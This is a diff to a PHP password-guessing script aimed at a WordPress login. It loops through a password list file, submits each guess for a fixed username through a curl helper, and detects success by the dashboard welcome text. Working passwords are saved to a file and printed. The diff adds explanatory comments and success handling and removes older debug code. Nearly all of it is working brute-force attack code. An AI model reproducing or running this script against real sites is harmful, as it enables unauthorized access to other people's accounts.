@@ -11,40 +11,34 @@ echo "\n";
 
 $fileHere = fopen("smallList.txt", "r") or die ("Cant open file!");
 while(!feof($fileHere)){
+
+    //For visibility while testing
     echo "----------------------------------\n";
     echo "New one                           \n";
     echo "----------------------------------\n";
     $password = fgets($fileHere);
+
+    //To see what passwords we are trying
     echo "The username we are trying is " .$username . " \n";
     echo "The current password we are trying is ... " . $password;
     echo "\n";
+
     $resultFromCurl = get_web_page( $url, $username, $password);
-    //this confirmed we are now returning a result each time
-    //print_r($resultFromCurl['content']);
-/*
-    $needle = "Lost";
-    $checker = strpos($resultFromCurl['content'], $needle);
 
-    //if checker is true, which means the word $needle is there
-    if($checker !== false){
-        echo "The value of checker is " . $checker . "\n";
-    }
-    //if checker is false
-    else{
-        echo "Checker is false and it looks like this: " . $checker ."\n";
-    }
-
-    */
+    //If we see this, we know that we are logged in
     $needle = "Welcome to your WordPress Dashboard!";
-    //$needle = "This is your first post.";
+
+    //Search the resultFromCurl content for the needle. It will be NOT false when it finds something (returned as an int)
     $checker = strpos($resultFromCurl['content'], $needle);
-    echo "checker var is $checker \n";
-    echo "The print of resultFromCurl is ";
-    print_r($resultFromCurl);
-    //$checker = true;
+    //echo "checker var is $checker \n";
+    
+
 
     if($checker){
         file_put_contents("passwordsThatWorked.txt", $password, FILE_APPEND);
+        echo "It worked!! The password is $password \n";
+        echo "Exciting \n";
+        exit();
     }
     
 
